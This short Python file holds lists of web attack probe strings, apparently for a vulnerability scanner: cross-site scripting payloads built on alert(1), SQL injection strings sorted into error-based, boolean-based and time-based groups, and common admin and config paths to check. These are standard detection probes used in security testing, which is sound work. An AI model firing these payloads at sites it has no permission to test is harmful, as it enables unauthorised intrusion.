
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg/onload=alert(1)>"
]

SQLI_PAYLOADS = {
    "error_based": [
        "' OR '1'='1",
        "' OR 1=1--",
        "'",
        '"'
    ],
    "boolean_based": [
        "' OR 1=1--",
        "' AND 1=0--"
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND SLEEP(5)--",
        "'; SELECT pg_sleep(5)--"
    ]
}

COMMON_PATHS = [
    "admin",
    "login",
    "dashboard",
    "config.php"
]
